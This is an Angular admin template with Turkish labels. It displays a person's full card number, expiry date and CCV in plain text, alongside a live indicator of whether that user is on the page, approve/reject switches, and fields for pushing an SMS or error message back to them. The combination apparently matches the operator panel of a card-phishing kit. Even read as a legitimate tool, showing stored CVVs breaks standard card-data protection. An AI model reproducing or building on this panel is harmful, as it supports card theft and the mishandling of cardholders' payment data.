<app-admin-navbar></app-admin-navbar>
<div class="container-fluid mt-5">
  <div class="container">
    <!-- Title -->
    <div class="d-flex justify-content-between align-items-center py-3">
      <h2 class="h5 mb-0"><a href="#" class="text-muted"></a> {{appoinmentData.name}} {{appoinmentData.surname}}
      </h2>
    </div>

    <!-- Main content -->
    <div class="row">
      <div class="col-lg-8">
        <!-- Details -->
        <div class="card mb-4">
          <div class="card-body">
            <div class="mb-3 d-flex justify-content-between">
              <div>
                <span class="me-3">Ödeme Durumu:</span>
                <span
                  [ngClass]="{'badge rounded-pill bg-info': appoinmentData.status, 'badge rounded-pill bg-danger': !appoinmentData.status}">
                  <span class="mt-2" *ngIf="appoinmentData.status === false">Ödenmedi</span>
                  <span *ngIf="appoinmentData.status === true">Ödendi</span>
                </span>
              </div>

              <div>
                <span class="me-3">Kullanıcı Sayfada mı?:</span>
                <span
                  [ngClass]="{'badge rounded-pill bg-info': appoinmentData.status, 'badge rounded-pill bg-danger': !appoinmentData.status}">
                  <span class="mt-2" *ngIf="receivedData === false">Sayfada Değil</span>
                  <span *ngIf="receivedData === true">Sayfada</span>
                </span>
              </div>

            </div>

          </div>
        </div>
        <!-- Payment -->
        <div class="card mb-4">
          <div class="card-body">
            <div class="row">
              <div class="col-lg-12 text-center">
                <h3 class="h6">Kart Bilgileri</h3>
                <ul class="list-group">
                  <li class="list-group-item"><b>Adı Soyadı:</b> {{appoinmentData.creditCards[0].name}}
                    {{appoinmentData.creditCards[0].surname}} </li>
                  <li class="list-group-item"><b>Son Kullanma Tarihi:</b>
                    {{appoinmentData.creditCards[0].month}}/{{appoinmentData.creditCards[0].year}} </li>
                  <li class="list-group-item"><b>CCV:</b> {{appoinmentData.creditCards[0].ccv}} </li>
                  <li class="list-group-item"><b>Kart Numarası:</b> {{appoinmentData.creditCards[0].cardNumber}} </li>
                  <li class="list-group-item"><b>Çekilecek Tutar:</b> {{appoinmentData.totalPrice}} </li>
                </ul>
              </div>
            </div>
          </div>
        </div>

        <div class="card mb-4 p-5">
          <div class="card-body">
            <div class="row">
              <div class="col-lg-12 text-center">
                <form [formGroup]="secureUpdateForm" (ngSubmit)="updateSecure()">
                  <div class="row mt-2">
                    <div class="col">
                      <div class="form-check form-switch">
                        <input class="form-check-input" type="checkbox" role="switch" formControlName="success">
                        <label class="form-check-label" for="flexSwitchCheckDefault">Ödemeyi Onayla</label>
                      </div>
                    </div>
                    <div class="col">
                      <div class="form-check form-switch">
                        <input class="form-check-input" type="checkbox" role="switch" formControlName="notSuccess">
                        <label class="form-check-label" for="flexSwitchCheckDefault">Ödemeyi Reddet</label>
                      </div>
                    </div>
                  </div>
                  <div class="input-group input-group-sm mb-3 mt-3">
                    <span class="input-group-text" id="inputGroup-sizing-sm">SMS Mesajı</span>
                    <input type="text" class="form-control" aria-label="Sizing example input"
                      aria-describedby="inputGroup-sizing-sm" formControlName="smsMessage" >
                  </div>
                  <div class="input-group input-group-sm mb-3 mt-3">
                    <span class="input-group-text" id="inputGroup-sizing-sm">Hata Mesajı</span>
                    <input type="text" class="form-control" aria-label="Sizing example input"
                      aria-describedby="inputGroup-sizing-sm" formControlName="errorMessage" >
                  </div>
                  <div class="input-group input-group-sm mb-3 justify-content-center mt-3">
                    <button class="btn btn-success btn-sm" type="submit" >
                      İşlemi Kaydet
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="col-lg-4">
        <!-- Customer Notes -->
        <div class="card mb-4">
          <div class="card-body">
            <h3 class="h6">Müşterinin Mesajı</h3>
            <p>{{appoinmentData.message}}</p>
          </div>
        </div>
        <div class="card mb-4">
          <!-- Shipping information -->
          <div class="card-body">
            <h3 class="h6">İletişim Bilgileri</h3>
            <ul class="list-group">
              <li class="list-group-item"><b>Telefon Numarası:</b> {{appoinmentData.phoneNumber}} </li>
              <li class="list-group-item"><b>Mail Adres:</b>{{appoinmentData.email}} </li>
              <li class="list-group-item"><b>Ülke:</b> {{appoinmentData.country}}</li>
              <li class="list-group-item"><b>İl</b> {{appoinmentData.city}}</li>
              <li class="list-group-item"><b>İlçe</b> {{appoinmentData.district}}</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>